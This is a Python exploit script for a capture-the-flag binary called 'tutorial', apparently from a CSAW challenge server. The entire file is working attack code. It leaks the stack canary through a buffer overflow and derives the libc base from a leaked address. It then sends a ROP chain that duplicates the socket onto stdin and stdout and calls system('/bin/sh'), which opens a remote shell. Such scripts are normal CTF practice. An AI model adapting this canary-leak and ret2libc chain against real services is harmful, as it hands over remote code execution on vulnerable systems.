#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'pwn.chal.csaw.io','port':8002})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_amd64_local', \
                        remote  = 'libc-2.19.so')
env.select()

binf = ELF('tutorial', rop=True)
libc = ELF(env.libc)

addr_plt_alarm  = binf.plt('alarm')
addr_pop_rdi    = binf.ropgadget('pop rdi', 'ret')
addr_pop_rsi_r15= binf.ropgadget('pop rsi', 'pop r15', 'ret')

#==========
def attack(cmn):
    canary  = get_canary()
    info('canary            = 0x%08x' % canary)

    cmn.read_until('>')
    cmn.sendln('1')

    m = re.search('Reference:(0x[0-9a-f]+)', cmn.read_until())
    addr_libc_puts  = int(m.group(1),16)+0x500
    libc.set_location('puts', addr_libc_puts)
    addr_libc_dup2      = libc.function('dup2')
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')
    info('addr_libc_base    = 0x%08x' % libc.base)

    exploit  = '\x00'*0x138
    exploit += pack_64(canary)
    exploit += pack_64(0xdeadbeef)
    
    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(0)
    exploit += pack_64(addr_plt_alarm)
    
    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(4)
    exploit += pack_64(addr_pop_rsi_r15)
    exploit += pack_64(STDIN_FILENO)
    exploit += pack_64(0)
    exploit += pack_64(addr_libc_dup2)
    exploit += pack_64(addr_pop_rsi_r15)
    exploit += pack_64(STDOUT_FILENO)
    exploit += pack_64(0)
    exploit += pack_64(addr_libc_dup2)
    
    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(addr_libc_str_sh)
    exploit += pack_64(addr_libc_system)

    cmn.read_until('>')
    cmn.sendln('2')
    cmn.read_until('>')
    cmn.send(exploit)
    cmn.read(0x144)

def get_canary():
    cmn = Communicate(env.target,mode='SOCKET', disp=False)
    
    cmn.read_until('>')
    cmn.sendln('2')

    cmn.read_until('>')
    cmn.send('a'*0x138+'!')
    cmn.read_until('a!')
    canary = unpack_64('\x00'+cmn.read(7))

    del(cmn)
    return canary

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
